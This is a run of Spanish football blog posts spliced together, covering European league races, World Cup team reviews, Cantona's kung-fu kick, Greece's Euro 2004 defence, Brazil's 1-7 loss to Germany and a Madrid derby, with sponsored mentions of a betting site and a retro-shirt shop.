y la concentración excesiva en ella –descuidando la Bundesliga-, aún más peligrosa, y que le ha dejado ya a 14 puntos de un Bayern que va a lo suyo y que también ha cruzado el rubicón europeo. Es verdad que los borussers sufrieron ayer un grave error arbitral –que el propio colegiado reconoció posteriormente, igualito que aquí- y que su grupo europeo era el de la muerte, pero eso no excusa tantos puntos perdidos frente a equipos como Nuremberg o el sorprendente Hannover. El Leverkusen está a once puntos, pero es convidado de piedra en este banquete: bastante tienen Schurrle y Kiessling con mantener al equipo ahí.Italia. La única gran Liga que conserva a día de hoy gran parte de la emoción con la que se inició es la Serie A. Tras unas semanas complicadas, el Inter de Stramaccioni se ha rearmado, especialmente después de su épica victoria en la guarida de la Juventus, y este fin de semana tumbó al Nápoles y lo superó en la clasificación. Sin embargo, aunque la distancia es solamente de cuatro puntos, las sensaciones, el ritmo y el fútbol moderno que muestra semana tras semana el equipo de Conte –que volvió ayer tras su sanción- transmiten más sensación de favoritismo que la propia diferencia de puntos. En cualquier caso, el rival claro es el renovado equipo neriazzurro, por cuanto que Mazarri sufre de miedo a las alturas y su equipo se despeña una y otra vez en las cercanías de la cumbre.Al menos, aquí hay lucha. Algo es algo. Holanda. Subcampeona. Seis partidos ganados y uno perdido,  doce goles a favor y seis en contra. Goleadores: Sneijder (4), Robben (2), Kuyt, Van Persie, Huntelaar, Van Bronckhorst y dos goles en propia puerta.Lo mejor: capacidad de supervivencia en los peores momentos frente a equipos superiores, la rapidez de las combinaciones en ataque y la fidelidad a su idea de juego.Lo peor: el rosario de navajazos en la final, una mancha negra e indeleble en una de las camisetas más gloriosas y queridas por los aficionados. Como dijo Carlos Martínez: “a esta Holanda el fútbol no le debe nada.” La estrella: Wesley Sneijder. Tan iluminado como el resto de la temporada, ha demostrado cómo ser jugador franquicia sólo con pase, tiro y llegada.El momento: la ocasión fallada por Robben en el mano a mano con Casillas en la final, decisiva en la consecución del campeonato, y que mostró una de las pocas carencias de un jugadorazo.Japón. Octavos de final. Dos partidos ganados, uno empatado y otro perdido, cuatro goles marcados y dos encajados. Goleadores: Honda (2), Endo y Okazaki.Lo mejor: la atractiva propuesta de Okada, la efectividad en las jugadas a balón parado y el poderío físico mostrado por la selección.Lo peor: que el miedo desnaturalizase su juego en el octavo de final contra Paraguay, y les sumiese en la misma onda anodina que a muchas otras selecciones mundialistas. De poco les sirvió.El mejor: Keisuke Honda. Tomando el relevo de Nakamura, dejó multitud de detalles que hablan de un media punta fino y talentoso con capacidad para voltear partidos.El momento: el tercer gol ante Dinamarca, de rara belleza, que confirmaba la presencia del equipo en la segunda fase tras un partido colosal.Dinamarca. Caída en la primera fase. Un partido ganado y dos perdidos, tres goles a favor y seis en contra. Goleadores: Bendtner, Rommedahl y Tomasson.Lo mejor: su manera de lanzarse a tumba abierta frente a Camerún en el segundo partido. Era su única oportunidad.Lo peor: la sensación de que la columna vertebral de la selección son futbolistas ya muy pasados, y un rosario de fallos defensivos intolerables en un equipo de cierto nivel.La estrella: nos quedamos con la gran actuación de Dennis Rommedahl frente a los leones indomables. Un jugador ciclotímico, que ese día reventó la banda derecha.El momento: el penalty de Tomasson en el último partido, que entró tras remacharlo y causó lesión en el delantero, es una buena alegoría de lo que queda de la otrora “Dinamita Roja.” Camerún. Eliminada en la primera fase. Tres derrotas, con dos goles marcados y cinco encajados. Goleador: Eto’o (2). Lo mejor: la primera media hora del partido frente a Dinamarca, un oasis en medio del horror absoluto.Lo peor: problemas internos en el seno de la selección, declaraciones extemporáneas, Eto’o a un nivel bajísimo… el peor equipo del Mundial junto a Corea del Norte fue una fuente de malas noticias.La estrella: difícil destacar a un jugador camerunés. Quizá algunas arrancadas de Achille Emaná.El momento: podemos quedarnos con el primer gol de Samuel en un Mundial que no recordará con demasiado cariño. Se acerca ya el final de la ronda inicial de la Liga de Campeones, y con ello el comienzo de la auténtica Copa de Europa. En ella estará el Madrid, firmando la que puede ser mejor clasificación de cualquier equipo en la historia de la competición; hoy ha destruido 6-2 a un bisoño Dinamo de Zagreb, en una noche que se recordará por el 3-0 en los ocho primeros minutos, el claqué de Benzema y la reivindicación de Callejón. Exactamente el camino opuesto ha completado hoy el Villarreal, arrollado en el Allianz (3-1) por un Bayern que constituye la alternativa clara al poderío español. La gran incógnita ronda Manchester, tras caer el City hoy en San Paolo (2-1) ante un gran Nápoles y un mejor Cavani, y empatar el United en su feudo (2-2) frente al Benfica, en un partido repleto de despropósitos. Los de Fergie deberán ganar en Basilea al equipo de Shaqiri, que cumplió en Otelul (2-3) y ahora depende de sí mismo, mientras que los citizens han de esperar el arranque de dignidad del Villarreal mientras ellos tumban al Bayern. La segunda fase también contará con el Inter, que ha logrado el punto que le faltaba en Trabzon, y casi seguro con el Ajax, empatado a cero en el Arena frente a esta triste versión del OL. A la plaza restante aspirará el Lille, que tiene un tesoro en Hazard, y que conquistó Moscú (0-2) ante un CSKA que perdió su gran oportunidad. El Madrid ha resuelto con total suficiencia y bastante clase su compromiso de esta noche en Màlaga, ante un equipo que ha mostrado detalles interesantes, especialmente en ataque, pero que se ha mostrado incapaz de hacer frente al alto ritmo impuesto desde el principio por el equipo blanco. Tras un comienzo equilibrado, la tàctica inicial de Mourinho de cargar todo el juego por la banda izquierda ha dado resultado, y un trallazo al larguero del intrascendente Khedira  ha venido sucedido por un medido centro de Cristiano que ha rematado sutilmente Higuaín en el segundo palo. El  Màlaga ha mostrado orgullo en la reacción que ha comandado Quincy, pero el segundo tanto del Madrid, anotado por Cristiano tras gran jugada de Özil al contragolpe, ha cerrado el partido antes del descanso. El segundo tiempo ha quedado para constatar que el equipo de Mourinho está comenzando a desarrollar un juego de toque y asociación más que interesante, la reaparición de Pedro León y Canales –ambos ausentes cierto tiempo por causas diversas-, los tantos de Cristiano e Higuaín  y el  del honor malacitano del noruego Kris, y la constatación de que el mediapunta turco del Madrid, si no se pierde por el camino, está llamado a ser alguien en el fútbol mundial los próximos años. Tiene todo lo que se le puede exigir a un futbolista que juegue en esa posición tan difícil, y de su mano el Madrid ha crecido hasta comenzar a parecer una escuadra temible. Tendrá una buena prueba de fuego el martes. El Madrid consumó en el primer match-ball. En un ambiente muy hostil, los merengues se han impuesto en San Mamés (0-3) por el mismo resultado con el que lo hizo el curso pasado, y cierra de este modo una gran temporada. Con la novedad de Higuaín, titular en uno de los momentos claves del curso, y frente a un Athletic afeitado por las bajas de Ander, Muniain e Iturraspe, el equipo blanco mostró que en general, en fútbol, jugarse mucho es siempre mejor que no jugarse nada. El partido se abrió con un penalty que marró Cristiano –malos recuerdos del miércoles- y los goles del Pipa y Özil que certificaban el dominio de los visitantes. El tercero, de Cristiano Ronaldo nada más comenzar la segunda parte, y la expulsión de Javi Martínez mediada ésta acabaron de cerrar un partido que desde el primer momento salió de una sola dirección. En cualquier caso, el Athletic se batió con bravura, y aunque no mostró casi en ningún momento la intensidad que ha distinguido al equipo este curso, sí se fue del partido habiendo pegado dos postes, y con la sensación de que al menos mereció un gol. El futuro inmediato es suyo –les esperan Bucarest y Valencia- mientras que el presente rabioso es el de un equipo blanco que ha logrado, dada la entidad de su gran competidor, una de las ligas más difíciles de su historia. Felicidades. En Europa League, los cruces serán Atlético de Madrid–Hannover 96, Schalke 04–Athletic de Bilbao, Sporting–Metalist Kharkiv y AZ Alkmaar–Valencia. El efectivo despeje de puños del zaguero Izaguirre dentro del área hondureña en el partido de ayer nos ha traído a la cabeza la mano quizá más famosa de la historia del fútbol, el salto en el que Maradona niveló de modo ilegal su diferencia de estatura con Shilton y utilizó la pelusa de su sobrenombre para ocultar su pícara acción. Después nos ofreció la maravilla de las maravillas para redimirse, pero el gol postrero de Lineker devolvió la importancia a una acción que dejó en Inglaterra heridas de imposible cicatrización. El camino hacia la final estaba abierto, y una nueva expresión, inventada por el autor, se asentaba en el folklore futbolero: la mano de Dios. Se enfrentan hoy Sevilla y Barcelona en el estadio Ramón Sánchez Pizjuán (20:00 h), en un momento que no resulta especialmente feliz para ninguna de las dos instituciones, y que torna especialmente indeseable la eventualidad de una derrota.Después de algunas semanas con cierta polémica y algunas declaraciones indeseables, la que estamos concluyendo se presumía por fin tranquila y feliz en el entorno del Barcelona. En lo primero colaboraba la buena racha de resultados lograda por el equipo en los últimos partidos, que ha enlazado seis victorias consecutivas entre Liga y Liga de Campeones, incluyendo las brillantes goleadas frente a Valencia y Bayer Leverkusen. La enésima exhibición de Messi volvía a hacer correr ríos de tinta y, tras recuperar lesionados, el once se parecía de nuevo al equipo tipo que arrasó la pasada temporada a quien se le cruzó en el camino. Además, varios medios anunciaban la renovación de Guardiola para el jueves, deseado punto final a la gran incertidumbre que, desde Rosell hasta el último aficionado, mantiene desde hace meses en vilo al barcelonismo.Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Sin embargo, en los últimos días se han acumulado las malas noticias para el conjunto azulgrana. Tras la foto oficial del club y una nueva reunión de Pep con el presidente, el jueves se cerraba sin el anuncio deseado, y la posterior rueda de prensa del entrenador no despejaba ninguna duda. El viernes fallecía Estanislao Basora, delantero histórico del club y gloria de la selección española de la posguerra, y el sorteo de la Champions deparaba un periplo duro y difícil para las últimas rondas de la máxima competición. Malas nuevas todas, pero ninguna de la magnitud de que Abidal necesita un nuevo hígado. El anuncio oficial de la recaída ha conmocionado al mundo del fútbol, pero muy especialmente al club blaugrana, que recibe así un mazazo tanto anímico como deportivo en un momento clave de la temporada, y cuyo efecto sobre el rendimiento del equipo –que se halla en una situación menos idílica que el pasado ejercicio en circunstancias similares- es una incógnita.Al otro lado, las aguas también bajan algo turbias. Al optimismo con el que comenzó la etapa Míchel a orillas de Nervión le ha sucedido un cierto desencanto con la derrota en el Molinón ante el voluntarioso Sporting de Clemente, y Del Nido ha acabado de viciar el ambiente con una inoportuna carga de profundidad  sobre sus futbolistas, a los que acusó de no dar el nivel adecuado.Delantero de potencia, de espacios abiertos y con pinta de regalar grandes tardes. ¿Gio? ¿Quién era Gio?Keylor Navas. En pleno debate abierto (otro más) alrededor de la, al parecer, inminente llegada del que sería tercer portero de primer nivel a la plantilla del Real Madrid, Keylor completó el sábado su mejor actuación individual desde su llegada a Chamartín. Más allá, incluso, de su brillante actuación bajo palos (penalti detenido a Rubén Castro incluido), el costarricense consiguió por fin aunar la voz del Bernabéu en un grito unánime alrededor del guardián de su portería. Keylor, que parece haberse quitado de encima esa imagen extraña de portero de equipo pequeño, es ya el portero que todo el madridismo quiere.Sergi Darder. Es extraño que un futbolista acapare protagonismo sin haber jugado un solo minuto. En el caso del centrocampista balear, su presencia en este quinteto viene impuesta precisamente por su ausencia. Porque, sin comerlo ni beberlo, Javi Gracia recibió en la víspera del partido de los suyos en el Camp Nou la incómoda noticia de que uno de sus futbolistas más importantes iba a ser inminentemente traspasado al Olympique Lyonnais, una decisión que ‘ni entendía, ni compartía‘. Un nuevo episodio de entrenador cuya opinión cuenta poco o nada. Un nuevo caso de maniobra de despachos y representantes a espaldas de la dirección técnica. Malo para el Málaga.Nolito. Se preveía un final del mes de agosto ciertamente movido para el delantero andaluz. La salida de Pedro del Barça le colocaban como el inmediato recambio del tinerfeño. Sin embargo, a apenas unas horas del cierre del mercado de fichajes, dos goles suyos ante el Rayo dejan al Celta como líder de Primera, con dos victorias tras dos jornadas. De la asociación que ensamble con Iago Aspas dependerán gran parte de las aspiraciones viguesas. Lo que el Celta puede llegar a ser con Nolito ya pudimos apreciarlo en la noche del sábado. En lo que se quedaría de cerrarse finalmente su traspaso al Barça es mejor no pensar.Lucas Pérez. Hacía muchos años que una incorporación no levantaba tanta ilusión en A Coruña como la que conseguía por fin cerrarse hace apenas diez días y vinculaba a Lucas Pérez con el Dépor los próximos cuatro años. Su vuelta, tras haber jugado en Riazor como cedido por el PAOK la pasada temporada y media vida dando tumbos, se interpretó como el regreso del hijo pródigo. Como un movimiento para que el deportivismo recuperase la autoestima entregando su futuro a las botas de un coruñés rebosante de compromiso. En un equipo con no demasiado gol, su aportación como delantero (posición en la que Víctor parece decidido a encajarlo) se antoja decisiva. Lo fue el domingo en Mestalla, para arrancar un valioso punto en terreno hostil. Vuela Éric Cantona en escorzo horizontal y en mi imaginación se desatan los primeros acordes de ‘Teenage kicks‘ de los viscerales Undertones. Acaba de ser expulsado tras patear, después veríamos que se trataba simplemente de un ejercicio de calentamiento, a Richard Shaw, el fervoroso defensor del Crystal Palace que se había pasado el partido encima del atacante francés. Un partido muy físico, con el césped muy pesado, de brega y pelea por cada centímetro de terreno. ‘Realmente todo fue culpa de Shawsy. Hizo su trabajo tan bien, anuló de tal manera a Éric, que acabó frustrado y no pudo evitar patear el culo de Richard cuando este le entró duro. Se le fue la cabeza‘, recuerda para ESPN John Salako, que cubría el costado izquierdo de la defensa del Palace aquella tarde.En su parsimonioso camino hacia el túnel de vestuarios, Cantona sintió la ira y la burla generalizada de Selhurst Park. Desafiante como en él era habitual, explotó definitivamente cuando terminó de acercarse al graderío. En una súbita aceleración hacia la banda, el atacante francés escupió su frustración sobre Matthew Simmons, un joven aficionado del Crystal Palace que había abandonado de forma atropellada su localidad en la grada para lanzar a gritos un recuerdo a la madre del delantero del United. Fue tan rápido que a los que estaban más cerca de la acción les costó reaccionar. Su patada, más propia de una exhibición de artes marciales que de un partido de fútbol, dio la vuelta al mundo. Su imagen volando en paralelo al suelo con el pie por delante se convirtió en un icono que acabaría acarreando graves consecuencias.Fue el propio club el que se apresuró a tomar cartas en el asunto y sancionar a su jugador estrella con cuatro meses sin jugar con el equipo, antes incluso de que la Federación tomase una decisión al respecto. Perdía así, además, muchas opciones de alzarse con un título liguero que se había convertido en una carrera de fondo mano a mano con el Blackburn Rovers de Alan Shearer y Tim Sherwood, que al final acabaría saliendo campeón por un solo punto de ventaja. Pero, por extraño que pueda parecer en estos tiempos que corren en los que cada jornada suele dejar tras de sí un reguero de deplorables ejemplos, las prioridades estaban muy claras en Old Trafford y la pelea por el título pasaba a un segundo plano ante el bochornoso comportamiento de su mejor futbolista. ‘Solo quiero hacer lo que me apetezca hacer. Si quiero patear a un aficionado, lo hago. No tengo que ser ningún modelo de comportamiento’Fueron días complicados para Éric, que en ningún momento mostró arrepentimiento alguno por su descontrolada reacción. A la sanción impuesta por el club hubo de sumarle cuatro meses más de inhabilitación, para un total de ocho, por parte de la Federación y 120 horas de trabajos en beneficio de la comunidad. Cantona, herido y perseguido por una prensa sensacionalista inglesa ávida de titulares sonoros, dejó entonces una frase para la posteridad y que acabaría definiendo los años finales de su carrera y su relación con los medios: ‘Cuando las gaviotas siguen al barco es porque saben que acabará arrojando sardinas al mar‘. Recluído en Francia y excluído definitivamente de la selección francesa, tal fue la presión soportada que Cantona a punto estuvo de dar un giro a su carrera y abandonar el Manchester United. Solo la oportuna intervención de Alex Ferguson, quien estaba convencido de que aún quedaban éxitos por cosechar, evitó que el francés fuese traspasado a otro club lejos de Inglaterra y pudiera prolongar su leyenda en Old Trafford.Han pasado veinte años de la escena que marcó, para bien o para mal, la carrera de Éric Cantona.Contra el Cádiz, Diego fue nuestro Gil Reyes. En el Tartiere, los putos hombros de todo el oviedismo. Y por él seguimos mirando hacia arriba y buscando nuestro sitio en el mundo.El viernes o el sábado, si seguimos enteros, hablamos de sensaciones, de tácticas, de matemáticas camino de la prórroga, pero hoy he abierto un caramelo para la tos y solo me apetece hablar del nueve. Hablar poco y agradecer. Al fin y al cabo, por su culpa estamos afónicos y por la nuestra andará él con la garganta quebrada. Me duele una mano por golpear el asiento contiguo y a él le dolerá otra por castigar el césped después de engancharnos a la eliminatoria. Dicen que es una locura pero es pasión. A estas alturas de la película me vale esa comunión y ese empuje para pensar que podemos sacarlo adelante. La ventaja es suya pero nosotros estamos muy vivos. Si nuestro Gil Reyes confía y los diez que le rodeen dicen que hay pelea, solo nos queda creerles hasta el último minuto del partido en Cádiz. Subirnos a hombros y seguir buscando porque en juego está una estrella. En el batallón de escritores, periodistas, blogueros y aficionados a la charla que nos dedicamos a lo futbolístico se ha puesto muy de moda el parnasianismo. Lo suyo es tifar teclado en ristre (otra costumbre la mar de extendida en el gremio) a favor de aquellos onces con inevitable afición a amasar la pelotita por amasarla, a marear la perdiz como los ángeles, a divagar con o sin motivo y a aplicarse a rajatabla el cuento del arte por el arte. Y no habría problema si defender, ya no otro tipo de estilo sino que el fútbol es una biblioteca rica en planteamientos y finales felices a los que llegar por distintos senderos, no nos soliese llevar a los que no comulgamos al debate inane por sistema. Cuando no al descrédito o directamente a la burla. De eso sabemos algo los editores de Diarios de Fútbol. Entonces, por tocar un poco las narices y porque hoy es actualidad en esta segunda jornada mundialista, me apetece dedicarle unas líneas precisamente a una obra maestra que se diría creada para molestar a los parnasianos. Quiero acordarme de los defensas griegos en la Eurocopa de 2004. Dellas y Kapsis, Fyssas y Seitaridis. Cuatro hombres, los últimos de la lista cuando el ejecutivo de Nike se lía a repartir sms para grabar el anuncio de las filigranas, que siguen grabados a fuego en la memoria de los hinchas helenos por depositar a una selección infrafutbolera como pocas en el mismo lecho de la gloria. Y para lograrlo decidieron saltarse a la torera el paseillo frente al tendido siete del fútbol escrito. Lo hicieron al revés. Tiraron de fuerza y obediencia a un plan y transformaron la portería de aquel equipo, una autopista hacia el cielo de los rivales sobre el papel,  en un acorazado inabordable. ¿Su carta de presentación? Se convirtieron en la primera selección en ganar la Eurocopa sin encajar ni un miserable gol durante la fase de eliminatorias. Y de paso se cepillaron a los buenos (la República Checa), a los campeones (Francia) y a los anfitriones (Portugal). Ahí es nada.Y remarcó que eran cuatro cuando en realidad fueron cinco. Había un George Martín, el Phil Spector un poco chalado y severo de la trastienda para dirigir aquel bruto mecánico de cuatro cuerpos. Hablo de Otto Rehhagel. Echando mano de la Ottocracia (dícese del sistema de gobierno ciertamente polvoriento y a todas luces ajeno a lo democrático que lleva pariendo éxitos más de dos décadas) esa suerte de Brian Clough teutón le presentó a cada defensa griego una pareja de baile para toda la vida. Ordenó marcar al hombre para ganar por ganar. Se tapó los oídos ante las repetidas críticas y fue al pasado para regresar al futuro. Ninguno de los suyos discutió al maestro y lo que aun hoy sigue torciendo el hocico de los parnasianos, la blasfemia al jogo bonito que conviene enterrar bajo el oropel del nuevo orden jugón, resultó ser la llave de un triunfo legendario. Tan bello como el que más. Ser fetichista a tiro hecho es fácil. Que sí, que agarrar esa zamarra que te ha cascado Baltasar este año a cambio de cuatro yayitas revenidas y estamparle un pedazo de siete coronado con el garabato de Cristiano Ronaldo está chupado. Con todos los respetos, es una mariconada. Pero cosa bien diferente, la que únicamente el núcleo duro de los aficionados a las teluchas deportivas puede paladear en su justa medida es lo de ojear la elástica de el equipo que te hace tilín y por ahorrarte cuatro perras en ebay, esas ofertas de última hora del demonio, mercar la que tiene nombre y verte obligado a atravesar el bloque luciendo la identidad de este o aquel ignoto paquete futbolístico a la espalda entre improperios y risotadas de la chavalería. Eso, como el brandy, es cosa de hombres. Puritito hardcore.Confieso que yo mismo tengo varias piezas absurdas por el estilo. Porque ya me dirán lo que pinta un servidor paseando con orgullo parabólico por Gran Vía, inmune a la solana justiciera, y vestido de jamaicano segundón en el Nottingham Forest, de soldado de fotuna brasileño en la selección de Túnez o de aquel delantero discreto que hacía pareja con uno de los Fashanu en el Wimbledon atómico de finales de los noventa. No faltará quien piense, angelito en su ignorancia, que el nombre que adorna mi camiseta es el de algún titán futbolístico y de ahí saco el arrojo para lanzarme a la calle de semejante guisa que si no… A cambio, eso sí, en el armario tengo réplicas de lo que vistieron Le Tissier, Chris Waddle o Robert Prosinecki ¡en el Portsmouth! en el armario para equilibrar el tema. Pero ese es otro asunto.De la mano de Classic Football Shirts, la tienda especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente, desde los uniformes con los que se ha construído la historia del deporte rey.No les entretengo más. Si les atrae esto de poseer la telucha con la que algún innombrable escribió su pequeña hazaña, seguro que encontrarán su camiseta en Classic Football Shirts. Así podrán conducirse hasta el supermercado anunciando con donaire las hazañas de un lateral negro del Aston Vila al que llamaban Perlinho, la sonrojantemente ajedrezada del Coventry que un día vistiera el gemelo malvado de Steve McManaman, la de un guardameta al que le falta tan solo una letra para hacer risa pese a la solemne y académica procedencia, la de un pobre discapacitado, Nando contra Nando y all you need is love, love, el traje que vistió una auténtica anomalía del balón o la que luciera el protagonista de uno de los mejores chistes en alemán de toda la historia. Una semana más y de la mano de Classic Football Shirts:  la tienda online especializada en camisetas antiguas, nos acercamos al  fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con  las que se ha construido la historia del deporte rey.Antes de lo textil hablemos primero del club. Como su tocaya en la Casa Blanca, la célebre habitación azul de Ibrox es un recibidor que la cúpula dirigente del Glasgow Rangers usa para departir tranquilamente con sus invitados. Pero si en el salón ovalado americano suelen despachar presidentes y líderes mundiales, en el recoleto cuarto que condensa el sentimiento Ger, lo hacen sus homólogos en el asunto de la pelota. The Blue Room ha tornado con el tiempo en un espacio multiusos. En ocasiones hace las  veces de elegante carta de presentación durante las ruedas  de prensa del club e incluso sirvió de improvisado gabinete al entrenador Bill  Struth: un acaparador de títulos que solía escapar de los rigores del empleo tocando el piano en dicha salita.Veinte años que han servido para convertirla en un referente inexcusable en el tiempo y en un icono futbolístico sin igual al que el propio futbolista supo sacar partido tras su retirada. Su imagen de jugador díscolo e irreverente pero absolutamente genial tuvo su prolongación en el Cantona canoso y entrado en kilos que hoy conocemos. Un personaje profundo, un villano brillante.Puedes encontrar camisetas de Éric Cantona (incluyendo la famosa equipación negra de la ‘kung-fu kick’) en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Sentado ante la temible pantalla en blanco por enésima vez en lo que llevamos de Mundial, el vacío que se abre ante mi teclado es esta noche mayor que ninguna otra. El abismo se presenta desafiante ante mi cansancio, mi saturación de fútbol y, sobre todo, ante un episodio que probablemente marcará un hito en mi memoria futbolística y sobre el que se va a hacer complicado extraer conclusiones sesudas. Alemania acaba de destapar la farsa que Brasil había dispuesto ante los ojos de todo el planeta como camino innegociable para llegar al éxito en su Mundial, en ese torneo que parecía predestinado a un final escrito tiempo atrás y siempre amable con la canarinha. La Brasil de Scolari, la Brasil intensa, la de los lloros y las plegarias, la de los himnos pasados de revoluciones se había creado una burbuja. Una burbuja de mentira que hoy ha reventado en las manos de una afición entregada y convencida. Los siete goles que la Mannschaft ha endosado a la anfitriona han restallado como siete latigazos en la espalda desnuda de un país que ha vivido la trayectoria de los suyos en el torneo envuelto en una mística y una pasión que sirvieron de burdo maquillaje a un juego ramplón consagrado al empuje de la grada y a la genialidad de un único futbolista: el hoy ausente Neymar Jr. A todas luces insuficiente para ganar un Mundial, por mucho que rozaran el éxtasis místico interpretando su himno nacional.Veinte minutos de furia desatada sirvieron para que Alemania le hiciese ser consciente a Brasil de que su fútbol tenía la solidez de un castillo de naipes. Desnuda, con todas las vergüenzas al aire, la canarinha se percató de pronto de que era muy vulnerable. De que simplemente con su público y su pasión no les iba a alcanzar para conquistar el objetivo planteado. Y fue entonces cuando se desmoronó. Asustada por una sensación de indefensión desconocida para ellos, Brasil asistió impertérrita a la hecatombe, a una derrota cuyo significado sobrepasa los límites de lo conocido y que necesitará de muchos años, quizá décadas, para ser calibrada en toda su extensión y trascedencia. Cuesta encontrar en la historia del fútbol un partido con el que emparejar y comparar la masacre de Belo Horizonte. Ni siquiera el rememorado Maracanazo del 50, empequeñecido desde esta misma noche, se sujeta ante la humillación del Mineirao.Con todo, y pese a lo traumático del caso, puede que los de Joachim Löw hayan hecho un favor a la verde-amarela. Alemania ha mostrado la realidad a Brasil en toda su crudeza. Le ha hecho ver que su comportamiento ha distado mucho del de un buen hijo. Que separándose así de la pelota, negándose a sí misma como ha venido haciendo desde hace unos años para acá, su futuro es negro y tormentoso. Porque cuando uno se traiciona de esa manera, cuando uno aspira a ser lo que nunca fue y jamás podrá ser, la realidad suele devolverle a su sitio con fiereza y sin miramientos. Brasil nunca cambiaría una batucada improvisada en plena calle por una orquesta sinfónica. Pero sí que cambió la pelota y la fantasía por un sucedáneo de su fútbol, del fútbol que la hizo tan grande como para ser pentacampeona del mundo. El resultado de esta noche, que traerá consigo consecuencias históricas, debería hacer replantearse ese infame cambio a todo el país. Pilsa es una pujante empresa dedicada al sector de las soluciones de almacenaje y mobiliario para hostelería profesional con sede en la localidad granadina de Armilla. Fundada en 1963 como un pequeño negocio familiar, la empresa ha ido creciendo de manera ininterrumpida a lo largo de sus cinco intensas décadas de existencia hasta acabar convirtiéndose en una referencia en su sector. No tengo ningún tipo de relación con el gremio de la hostelería y, como es de imaginar, no conocía la existencia de Pilsa. Hasta ayer.Sobre las inconfundibles franjas rojiblancas horizontales de la camiseta del Granada CF lucía el pasado sábado, en el partido liguero que enfrentó al cuadro nazarí con el CA Osasuna, el nombre de la, hasta entonces para mí, desconocida empresa granadina. Y todo por ayudar a los desfavorecidos, a las personas que más lo necesitan. En este caso, a los hijos de los presos granadinos que sufren la marginación y el rechazo social por la simple razón de tener un familiar cumpliendo condena. `Hijos del fútbol’ es una campaña solidaria puesta en marcha por el Granada CF que pretende ceder un espacio en ese lugar sagrado que es la camiseta del club para que, mediante el método de subasta, un anunciante puede ver el nombre de su empresa o de su idea en el pecho de los jugadores granadinistas. Habrá una subasta semanal (una por cada partido liguero del Granada) y lo recaudado en todas ellas se destinará de manera íntegra por parte del club a la campaña solidaria, encaminada especialmente a la creación de proyectos de educación y deportivos para esas personas en grave riesgo de exclusión social. La visita de los granadinos al Santiago Bernabéu del próximo sábado es un plato jugoso, y la puja para poder lucir emblema en el coliseo del Paseo de La Castellana, con su lógica repercusión, ya ha alcanzado los diez mil euros cuando aún queda más de un día para cerrar la subasta. No recuerdo muchas campañas que hayan sabido conjugar de manera tan elegante y eficiente dos mundos tan torpemente relacionados como el fútbol y la solidaridad. Las más sinceras felicitaciones para el Granada y el responsable de la idea. Se esperaba un derby madrileño áspero, de tensión, de taco afilado y pierna dura… y la realidad no defraudó. Tras las citas previas entre merengues y colchoneros de la presente temporada, el cuarto y definitivo duelo entre ambos no tenía pinta de mostrarse plácido. Una vez más, y son ya demasiadas en los enfrentamientos recientes entre Real Madrid y Atlético, la carretillada de provocaciones, insultos y teatrillos varios ocupó el sitio que debería haber ocupado el fútbol. A veces uno se plantea qué ocurriría si en choques como el del Calderón se aplicase con firmeza el reglamento en cuanto al capítulo de amonestaciones se refiere. Si el baremo para que un futbolista sea amonestado fuese el mismo que en un partido de guante blanco (¿y por qué no iba a serlo?) , ambos equipos terminarían el partido con varios futbolistas expulsados, con las delicadas consecuencias futuras que tal circunstancia podría traer aparejadas. En lugar de eso, en lugar de cortar por lo sano ayudándose de la aplicación del reglamento, Delgado Ferreiro permitió que los chispazos desembocaran en incendio incontrolado por considerar que el mejor criterio era el de no sancionar con amonestación las numerosas acciones que fueron merecedoras de ella a lo largo de todo el partido. Como si el mostrar menos cartulinas lo convirtiese por derecho en mejor árbitro.Supo el Atleti reaccionar ante el gol inicial del Benzema en el minuto dos de partido, y quizá estuvo ahí, en esos minutos inmediatamente posteriores al 0-1, la clave del desarrollo posterior del choque. Porque lejos de venirse abajo, lejos de arredrarse ante un partido que se les ponía muy cuesta arriba, a los de Simeone les faltó tiempo para agarrar la pelota, sacarla de las redes de Courtois y colocarla en el punto central para iniciar un nuevo asalto. Rápido se hicieron Gabi, Mario Koke y Raúl Garcia con los mandos del centro del campo, ayudados por los sablazos de un Arda hiperactivo que se dedicó a ofrecer continuas líneas de pase profundo a sus compañeros. Al Atleti le interesaba recuperar el ritmo taquicárdico en el partido, porque es precisamente ahí donde mejor se desenvuelve, y cuando el marcador del duelo comenzaba a señalar la zona roja del cuentarrevoluciones, Koke se encontró con un regalo de Arda (de nuevo Arda) para cruzar el balón y alojarlo allí donde no podía alcanzarlo Diego López.Antes de que el Madrid pudiese darse cuenta, el Atleti ya había puesto el partido donde pretendía. Con la permisividad arbitral asumida, cada balón dividido era una guerra abierta y una exhibición de poderío armamentístico constante. Y nada podría apetecerle más a este Atleti que llevar al Madrid al barro y obligarle a rascar en cada balón suelto por el centro del campo, distraerle, en resumen, ocupándole en cuitas en las que los colchoneros son maestros consumados. Fue por ahí por donde Gabi apreció el hueco abierto en la estructura blanca para colar el zapatazo del dos a uno.Siguiendo el partido por Twitter, hubo no pocos madridistas que, con el marcador adverso al descanso, comenzaron a señalar a Ancelotti como principal culpable de la derrota momentánea. Le acusaban, la mayor parte de ellos, de haber confiado los laterales a Arbeloa y Coentrao, en lugar de los más habituales Carvajal y Marcelo. La discutida decisión del italiano se fundamentaba en repetir la titularidad de Arbeloa y Coentrao que ya se dio en la ida de la semifinal de Copa, en la que el Madrid firmó uno de sus mejores partidos de la temporada al anular con un 3-0 al Atlético. En previsión de un Atleti intenso y profundo de inicio, parecía sensato blindar ambos carriles. La segunda parte del plan se pudo apreciar cuando, ya mediada la segunda mitad, Carlo decidió retirar del campo a ambos laterales, para dejar su puesto a los añorados Carvajal y Marcelo. Tras la ardua labor de zapa y desgaste de las líneas rivales desempeñada por Arbeloa y Coentrao, los habituales titulares encontraron sendas autopistas por sus carriles, pudiendo descuidar sus espaldas ante un Atleti cuyo físico se desinflaba minuto a minuto. Marcelo y Carvajal, más frescos que ninguno, aparecieron como dos estiletes definitivos ahí donde los partidos se deciden, abriendo el campo y aportando profundidad y llegadas a línea de fondo con muchísimo peligro. Fue en una de ellas, precisamente por la banda de Carvajal, en la que se originó el gol del definitivo empate de Cristiano Ronaldo. Un gol merecido, por pretendido y buscado, que afianza el liderato y refuerza la sensación de dominio madridista en los duelos recientes entre ambos equipos madrileños. Hasta el pasado mes de julio, Neymar era un futbolista de madrugadas. Un ave nocturna que, mientras aquí, a este otro lado del océano, todos dormíamos se dedicaba a sembrar los campos sudamericanos de jugadas inverosímiles, de 